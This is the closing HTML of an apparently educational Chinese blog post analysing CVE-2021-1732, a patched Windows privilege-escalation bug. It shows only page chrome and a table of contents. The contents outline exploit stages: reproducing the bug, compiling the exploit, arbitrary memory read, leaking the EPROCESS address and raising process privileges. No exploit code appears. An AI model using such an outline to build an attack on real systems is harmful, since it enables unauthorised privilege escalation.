</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">in1t</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://in1t.top/2022/01/04/CVE-2021-1732%E5%AE%8C%E5%85%A8%E6%94%BB%E7%95%A5/">https://in1t.top/2022/01/04/CVE-2021-1732完全攻略/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://in1t.top" target="_blank">in1t's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CVE/">CVE</a><a class="post-meta__tags" href="/tags/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/">本地提权</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/cve-2021-1732.jpg" data-sites="wechat,qq,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/06/14/justCTF-2022-AMXX/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/cover/justctf2022.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">justCTF 2022 - AMXX</div></div></a></div><div class="next-post pull-right"><a href="/2021/09/23/Koi-Bot%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/cover/koi_bot.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Koi Bot项目开发记录</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%BB%BC%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞综述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-2"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞特点[2]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8D%E7%9A%84%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="toc-number">2.3.</span> <span class="toc-text">受影响的系统版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C"><span class="toc-number">2.4.</span> <span class="toc-text">漏洞利用效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C-Win10-1809-%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-number">3.1.</span> <span class="toc-text">制作 Win10 1809 虚拟机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91-exp"><span class="toc-number">3.2.</span> <span class="toc-text">编译 exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.3.</span> <span class="toc-text">提权复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E6%A1%8C%E9%9D%A2%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B"><span class="toc-number">4.1.</span> <span class="toc-text">Windows 桌面程序编程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tagWND-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">4.2.</span> <span class="toc-text">tagWND 结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5%E7%BB%93%E6%9E%9C%E4%B8%BA%E5%AF%BC%E5%90%91"><span class="toc-number">4.3.</span> <span class="toc-text">以结果为导向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F%E4%B8%8B-pExtraBytes-%E6%AD%A3%E5%B8%B8%E8%B5%8B%E5%80%BC%E6%B5%81%E7%A8%8B"><span class="toc-number">4.4.</span> <span class="toc-text">两种模式下 pExtraBytes 正常赋值流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%E5%8F%8A%E9%9A%BE%E7%82%B9%E8%A7%A3%E5%86%B3"><span class="toc-number">4.5.</span> <span class="toc-text">POC 攻击手法及难点解决</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E5%8F%8A%E9%9A%BE%E7%82%B9%E8%A7%A3%E5%86%B3"><span class="toc-number">4.6.</span> <span class="toc-text">EXP 利用手法及难点解决</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-%E9%98%85%E8%AF%BB"><span class="toc-number">5.</span> <span class="toc-text">EXP 阅读</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">5.1.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="toc-number">5.2.</span> <span class="toc-text">内存布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8F%8A%E5%B0%81%E8%A3%85"><span class="toc-number">5.3.</span> <span class="toc-text">任意地址读的实现及封装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E8%BF%9B%E7%A8%8B-EPROCESS-%E5%9C%B0%E5%9D%80"><span class="toc-number">5.4.</span> <span class="toc-text">泄露进程 EPROCESS 地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">5.5.</span> <span class="toc-text">进程权限提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E5%B0%BE%E5%B7%A5%E4%BD%9C"><span class="toc-number">5.6.</span> <span class="toc-text">扫尾工作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">6.</span> <span class="toc-text">动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-20"><span class="toc-number">6.1.</span> <span class="toc-text">双机调试环境搭建[20]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA-%E5%8A%A0%E8%BD%BD-pdb-%E6%96%87%E4%BB%B6"><span class="toc-number">6.2.</span> <span class="toc-text">IDA 加载 pdb 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E6%9F%90%E4%B8%80%E8%BF%9B%E7%A8%8B"><span class="toc-number">6.3.</span> <span class="toc-text">调试某一进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-pdb-%E6%96%87%E4%BB%B6"><span class="toc-number">6.4.</span> <span class="toc-text">获取 pdb 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-%E5%85%B3%E9%94%AE%E7%82%B9%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">6.5.</span> <span class="toc-text">exp 关键点动态调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">6.6.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">6.7.</span> <span class="toc-text">结语</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">7.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/img/cover/cve-2021-1732.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By in1t</div><div class="footer_custom_text"><p><a style="margin-inline:5px" target="_blank" href="https://hexo.io/"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a><a style="margin-inline:5px" target="_blank" href="https://butterfly.js.org/"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-orange?style=flat&logo=bitdefender" title="主题采用butterfly"></a><a style="margin-inline:5px" target="_blank" href="https://github.com/"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://img.shields.io/badge/Source-Github-brightgreen?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a><a style="margin-inline:5px" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script async="async">var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())
setTimeout(function(){preloader.endLoading();}, 5000);</script><div class="js-pjax"></div><script defer src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script defer src="/js/modify.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="💐,🌸,💮,🏵,🌹,🥀,🌺,🌻,🌼,🌷,🌱,🌲,🌳,🌴,🌵,🌾,🌿,☘,🍀,🍁,🍂,🍃,🍇,🍈,🍉,🍊,🍋,🍌,🍍,🍎,🍏,🍐,🍑,🍒,🍓,🥝,🍅,🥥,🥑,🍆,🥔,🥕,🌽,🌶,🥒,🥬,🥦,🧄,🧅,🍄,🥜,🌰,🍞,🥐,🥖,🥨,🥯,🥞,🧇,🧀,🍖,🍗,🥩,🥓,🍔,🍟,🍕,🌭,🥪,🌮,🌯,🥙,🧆,🥚,🍳,🥘,🍲,🥣,🥗,🍿,🧈,🧂,🥫,🍱,🍘,🍙,🍚,🍛,🍜,🍠,🍢,🍣,🍤,🍥,🥮,🍡,🥟,🥠,🥡,🦪,🍨,🍩,🍪,🎂,🍰,🧁,🥧,🍫,🍬,🍭,🍮,🍯,🍼,🥛,☕,🍵,🍶,🍾,🍷,🍹,🍻,🥂,🥃,🥤,🧃,🧉,🧊,🥢,🍽,🥄" data-fontsize="20px" data-random="false" async="async"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":20,"vOffset":-65},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body></html>